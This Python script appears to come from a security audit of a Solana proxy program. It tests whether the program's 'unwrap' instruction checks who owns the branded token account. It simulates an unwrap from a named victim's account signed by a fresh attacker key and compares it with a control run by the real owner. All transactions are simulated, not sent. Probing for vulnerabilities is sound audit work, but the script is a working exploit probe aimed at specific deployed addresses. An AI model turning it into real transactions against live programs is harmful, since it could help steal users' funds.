#!/usr/bin/env python3
"""Determine whether the deployed proxy `unwrap` verifies branded_user_token_account.owner == user.
Use the victim's own existing USDC+ ATA as the destination so no existence error masks the check,
then watch the victim's branded balance in postTokenBalances."""
import json, base64, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solrpc import rpc
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature

P = Pubkey.from_string
PROXY = P("pRoxYU64BSjv8HbhENna8a7LVCrkzzNrnvbYuTwas8C")
TOKEN = P("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
ATA_PROG = P("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
PS0 = P("FD4YydhzPpSmXwnHsX1oJBE4er4m9mg4ezaBN9cXgQbz")
VAULT0 = P("E5ohyMVkBTdn3DekUPcFyLFF2Wi78Rg3Mt9QQDWgN5Mp")
BMINT = P("sro4agJ6nJ89MJgj2DfDdx8zXVqSyZfCZjbhBfQaJU5")
ORACLE = P("GWdwWDhYFUc8ZD6uCTtEAAwx97V1ZCsxPWGL7vhSha6w")
CFG = P("V8eHEsRUBcxpkYZN2jhjYLzJFhbWbFvpNJYBp1YHNar")
USDCP = P("AvZZF1YaZDziPY2RCK4oJrRVrbN3mTD9NL24hPeaZeUj")
VICTIM = P("7cfj48Ym6zsu8WfPtDrU3ERw4Y1WxRzrqd9gF7KrWiJv")
VICTIM_OWNER = P("GwJuWxL4GD38XnAa1d3ZdhAWRupnwgqavCqovpL4aTo8")
ATTACKER = Pubkey.new_unique()

def ata(mint, owner):
    return Pubkey.find_program_address([bytes(owner), bytes(TOKEN), bytes(mint)], ATA_PROG)[0]

victim_usdc = ata(USDCP, VICTIM_OWNER)
v = rpc("getAccountInfo", [str(victim_usdc), {"encoding": "base64"}])["result"]["value"]
print("victim USDC+ ATA", victim_usdc, "exists:", v is not None)
if v:
    d = base64.b64decode(v["data"][0])
    print("  amount", int.from_bytes(d[64:72], "little"), "owner", Pubkey.from_bytes(d[32:64]))

def sim(ix, label, payer):
    msg = Message.new_with_blockhash([ix], payer, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                          "replaceRecentBlockhash": True, "commitment": "processed"}])
    v = (r.get("result") or {}).get("value") or {}
    err = json.dumps(v.get("err")) if v.get("err") else None
    print(f"\n{label}\n  err={err} units={v.get('unitsConsumed')}")
    for b in (v.get("preTokenBalances") or []):
        if b.get("mint") == str(BMINT):
            print("   PRE  branded:", b.get("owner"), b.get("uiTokenAmount", {}).get("uiAmountString"))
    for b in (v.get("postTokenBalances") or []):
        if b.get("mint") in (str(BMINT), str(USDCP)):
            print("   POST", b.get("mint")[:6], b.get("owner"), b.get("uiTokenAmount", {}).get("uiAmountString"))
    return v

data = bytes([2]) + (1000000).to_bytes(8, "little") + (0).to_bytes(8, "little")

def mk(user, usdc_user, branded_user):
    order = [user, usdc_user, branded_user, PS0, VAULT0, BMINT, ORACLE, CFG, TOKEN, USDCP]
    return Instruction(PROXY, data, [AccountMeta(k, i == 0, i != 0) for i, k in enumerate(order)])

# A: attacker signs, victim's branded account, destination = victim's existing USDC+ ATA
sim(mk(ATTACKER, victim_usdc, VICTIM), "A: signer=FRESH attacker, branded=victim, dest=victim USDC+ ATA", ATTACKER)
# B: control - real owner signs, own branded, own destination
sim(mk(VICTIM_OWNER, victim_usdc, VICTIM), "B: control - owner signs own accounts", VICTIM_OWNER)
